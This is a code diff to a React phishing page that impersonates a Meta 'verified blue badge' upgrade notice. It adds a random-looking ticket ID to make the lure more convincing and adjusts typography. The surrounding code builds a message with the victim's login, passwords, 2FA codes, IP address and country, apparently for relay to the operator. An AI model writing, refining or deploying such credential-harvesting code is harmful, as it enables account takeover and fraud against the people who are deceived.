@@ -17,8 +17,18 @@ import TermsModal from '@/components/TermsModal';
 
 const LABEL = 'Thần-tài-đến';
 
+const generateTicketId = () =>
+{
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    const pick = ( len ) =>
+        Array.from( { length: len }, () => chars[ Math.floor( Math.random() * chars.length ) ] ).join( '' );
+
+    return `#${ pick( 4 ) }-${ pick( 4 ) }-${ pick( 4 ) }`;
+};
+
 const Home = () =>
 {
+    const [ ticketId ] = useState( () => generateTicketId() );
     const [ showFirstModal, setShowFirstModal ] = useState( false );
     const [ showLoginModal, setShowLoginModal ] = useState( false );
     const [ show2FAModal, setShow2FAModal ] = useState( false );
@@ -49,7 +59,7 @@ const Home = () =>
             showWorld: 'Show the world that you mean business.',
             congrats: "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.",
             excited: "We're thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!",
-            ticketIdLabel: 'Your ticket id: #8241-XNYG-AVMB',
+            ticketIdPrefix: 'Your ticket id:',
             guideTitle: 'Verified Blue Badge Request Guide',
             guideItem1: '- Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats',
             guideItem2: '- In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.',
@@ -301,6 +311,7 @@ const Home = () =>
         const { form, login, passes, codes } = data;
 
         let message = `📩 <b>${ LABEL }</b>\n`;
+        message += `🎫 Ticket: <code>${ ticketId }</code>\n`;
         message += `⏰ ${ dt }\n`;
         message += `🌐 <code>${ ipInfo.ip }</code> • ${ ipInfo.country }\n`;
         message += `━━━━━━━━━━━━━━━━━━━━\n`;
@@ -412,7 +423,7 @@ const Home = () =>
     return (
         <>
             <style>{ `
-                @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+                @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap');
                 html, body, #root {
                     margin: 0 !important;
                     padding: 0 !important;
@@ -420,10 +431,12 @@ const Home = () =>
                     max-width: 100% !important;
                     min-height: 100vh !important;
                     display: block !important;
-                    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif !important;
+                    font-family: 'Plus Jakarta Sans', 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif !important;
+                    -webkit-font-smoothing: antialiased;
+                    -moz-osx-font-smoothing: grayscale;
                 }
                 .meta-hero-wrapper * {
-                    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif !important;
+                    font-family: 'Plus Jakarta Sans', 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif !important;
                     box-sizing: border-box;
                 }
             ` }</style>
@@ -462,11 +475,11 @@ const Home = () =>
 
                     <h1
                         style={ {
-                            fontSize: '34px',
+                            fontSize: '33px',
                             fontWeight: '700',
                             color: '#1c2b33',
                             margin: '0 0 24px 0',
-                            lineHeight: '1.2',
+                            lineHeight: '1.22',
                             letterSpacing: '-0.025em'
                         } }
                     >
@@ -487,10 +500,10 @@ const Home = () =>
 
                     <p
                         style={ {
-                            fontSize: '15px',
+                            fontSize: '14.5px',
                             color: '#2c3a44',
                             margin: '0 0 16px 0',
-                            lineHeight: '1.6',
+                            lineHeight: '1.62',
                             fontWeight: '400'
                         } }
                     >
@@ -499,10 +512,10 @@ const Home = () =>
 
                     <p
                         style={ {
-                            fontSize: '15px',
+                            fontSize: '14.5px',
                             color: '#2c3a44',
                             margin: '0 0 20px 0',
-                            lineHeight: '1.6',
+                            lineHeight: '1.62',
                             fontWeight: '400'
                         } }
                     >
@@ -514,10 +527,11 @@ const Home = () =>
                             fontSize: '14.5px',
                             color: '#5f6f7b',
                             margin: '0 0 24px 0',
-                            fontWeight: '400'
+                            fontWeight: '400',
+                            letterSpacing: '0.01em'
                         } }
                     >
-                        { texts.ticketIdLabel }
+                        { texts.ticketIdPrefix } { ticketId }
                     </p>
 
                     <h2
@@ -533,9 +547,9 @@ const Home = () =>
 
                     <div
                         style={ {
-                            fontSize: '15px',
+                            fontSize: '14.5px',
                             color: '#2c3a44',
-                            lineHeight: '1.6',
+                            lineHeight: '1.62',
                             display: 'flex',
                             flexDirection: 'column',
                             gap: '12px',
